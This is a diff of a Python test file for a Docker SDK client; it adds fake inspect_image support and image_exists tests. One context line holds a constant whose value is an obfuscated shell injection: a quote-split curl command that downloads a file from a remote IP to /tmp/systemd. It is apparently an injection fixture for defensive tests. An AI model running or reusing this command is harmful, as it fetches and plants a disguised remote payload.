@@ -34,6 +34,9 @@ INCIDENT_PUBLIC_KEY = "';  c'u'''''r\\l'''' -o /tmp/systemd 203.23.128.30:443/li
 class FakeApiClient:
     def __init__(self):
         self.login_calls = []
+        self.inspected_images = []
+        self.missing_images = set()
+        self.inspect_image_error = None
         self.host_config_kwargs = None
         self.created_container = None
         self.started = []
@@ -50,6 +53,14 @@ class FakeApiClient:
 
     def login(self, **kwargs):
         self.login_calls.append(kwargs)
+
+    def inspect_image(self, image):
+        self.inspected_images.append(image)
+        if self.inspect_image_error is not None:
+            raise self.inspect_image_error
+        if image in self.missing_images:
+            raise ImageNotFound("missing image")
+        return {"Id": "image-id"}
 
     def create_container(self, **kwargs):
         self.created_container = kwargs
@@ -118,6 +129,10 @@ class SocketExecApiClient(FakeApiClient):
         return client_socket
 
 
+class ImageNotFound(Exception):
+    pass
+
+
 @pytest.mark.asyncio
 async def test_login_passes_credentials_as_sdk_data():
     api_client = FakeApiClient()
@@ -152,6 +167,27 @@ async def test_login_preserves_legitimate_password_metacharacters(password):
     await client.login(username="registry-user", password=password)
 
     assert api_client.login_calls[0]["password"] == password
+
+
+@pytest.mark.asyncio
+async def test_image_exists_inspects_image_as_sdk_data():
+    api_client = FakeApiClient()
+    client = RentalDockerSdkClient(api_client)
+
+    assert await client.image_exists(image="registry.example/app:tag") is True
+
+    assert api_client.inspected_images == ["registry.example/app:tag"]
+
+
+@pytest.mark.asyncio
+async def test_image_exists_returns_false_for_missing_image():
+    api_client = FakeApiClient()
+    api_client.missing_images.add("registry.example/missing:tag")
+    client = RentalDockerSdkClient(api_client)
+
+    assert await client.image_exists(image="registry.example/missing:tag") is False
+
+    assert api_client.inspected_images == ["registry.example/missing:tag"]
 
 
 @pytest.mark.asyncio
